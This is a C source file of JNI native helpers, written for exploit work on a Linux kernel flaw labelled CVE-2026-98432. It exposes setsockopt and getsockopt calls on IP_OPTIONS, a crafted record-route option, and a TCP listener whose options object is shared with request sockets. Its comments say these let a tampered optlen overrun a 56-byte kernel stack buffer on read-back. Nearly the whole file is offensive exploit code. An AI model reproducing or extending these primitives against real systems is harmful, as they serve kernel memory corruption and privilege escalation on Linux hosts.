// Native helpers for the CVE-2026-98432 work.
//
// Everything here exists because the interesting interfaces are syscalls that
// the Java networking stack does not expose:
//
//   * setsockopt(IP_OPTIONS)      makes the kernel allocate an ip_options_rcu
//                                 and hang it off the socket's inet_opt
//   * getsockopt(IP_OPTIONS)      reads that object back with
//                                 memcpy(optbuf, &inet_opt->opt,
//                                        sizeof(struct ip_options) +
//                                        inet_opt->opt.optlen)
//                                 into a fixed 56 byte stack buffer, so a
//                                 tampered optlen turns the read into a stack
//                                 overflow
//
// The Java side never needed either of these before, so the whole point of the
// file is to put those two calls - and a controlled socket - within reach.

#include <jni.h>

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define IP_OPTIONS 4

// A record route option that fills the whole 40 byte area.
//
// Length must be 3 + 4n, so 39 leaves one byte for a NOP. The pointer is parked
// past the end of the slot list so the receive path has nothing to stamp: when
// the pointer is <= optlen the kernel writes the preferred source address into
// the option bytes, which changes them underneath us.
static void fill_rr(unsigned char *buf, int len, uint32_t tag)
{
    memset(buf, 0, len);
    buf[0] = 7;             // IPOPT_RR
    buf[1] = (unsigned char)(len - 1);
    buf[2] = (unsigned char)len;
    buf[3] = (unsigned char)(tag >> 24);
    buf[4] = (unsigned char)(tag >> 16);
    buf[5] = (unsigned char)(tag >> 8);
    buf[6] = (unsigned char)(tag);
    if (len > 1) {
        buf[len - 1] = 1;   // IPOPT_NOP
    }
}

static jstring err(JNIEnv *env, const char *what, int code)
{
    char msg[192];
    snprintf(msg, sizeof(msg), "%s: %s (%d)", what, strerror(code), code);
    return (*env)->NewStringUTF(env, msg);
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_applyOptions(JNIEnv *env, jclass cls, jint fd, jint tag)
{
    (void)env;
    (void)cls;

    unsigned char opts[40];
    fill_rr(opts, sizeof(opts), (uint32_t)tag);

    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
        return -errno;
    }
    return 0;
}

// Read the options back. If optlen was tampered with while the object sat in
// the slab, this is where the kernel overruns its own stack buffer.
JNIEXPORT jstring JNICALL
Java_com_inj_Native_readOptions(JNIEnv *env, jclass cls, jint fd)
{
    (void)cls;

    unsigned char buf[512];
    socklen_t len = sizeof(buf);
    memset(buf, 0, sizeof(buf));

    if (getsockopt(fd, IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
        return err(env, "getsockopt", errno);
    }

    char hex[3 * 512 + 64];
    int n = snprintf(hex, sizeof(hex), "len=%d ", (int)len);
    for (socklen_t i = 0; i < len && n < (int)sizeof(hex) - 4; i++) {
        n += snprintf(hex + n, sizeof(hex) - n, "%02x", buf[i]);
    }
    return (*env)->NewStringUTF(env, hex);
}

// A listening TCP socket the kernel can grow children from.
//
// This is the socket whose inet_opt matters: tcp_v4_syn_recv_sock() clones the
// listener and copies ireq->ireq_opt into the child, so the object created by
// setsockopt() above is the one that ends up shared with a request socket.
JNIEXPORT jintArray JNICALL
Java_com_inj_Native_makeListener(JNIEnv *env, jclass cls, jint port)
{
    (void)cls;

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return NULL;
    }

    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)port);
    sa.sin_addr.s_addr = inet_addr("10.7.7.1");

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        int e = errno;
        close(fd);
        errno = e;
        return NULL;
    }
    if (listen(fd, 128) < 0) {
        int e = errno;
        close(fd);
        errno = e;
        return NULL;
    }

    jintArray out = (*env)->NewIntArray(env, 1);
    jint v = fd;
    (*env)->SetIntArrayRegion(env, out, 0, 1, &v);
    return out;
}

// Create a plain connected UDP socket that owns an ip_options_rcu of its own,
// without involving the TCP handshake at all. Useful as a control: if the
// options object survives here but not on the TCP path, the difference is the
// request socket lifetime, not the allocation itself.
JNIEXPORT jintArray JNICALL
Java_com_inj_Native_makeUdp(JNIEnv *env, jclass cls, jint tag)
{
    (void)cls;

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        return NULL;
    }

    unsigned char opts[40];
    fill_rr(opts, sizeof(opts), (uint32_t)tag);
    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts)) < 0) {
        int e = errno;
        close(fd);
        errno = e;
        return NULL;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(9999);
    sa.sin_addr.s_addr = inet_addr("10.7.7.9");
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    jintArray out = (*env)->NewIntArray(env, 1);
    jint v = fd;
    (*env)->SetIntArrayRegion(env, out, 0, 1, &v);
    return out;
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_closeFd(JNIEnv *env, jclass cls, jint fd)
{
    (void)env;
    (void)cls;
    return close(fd);
}
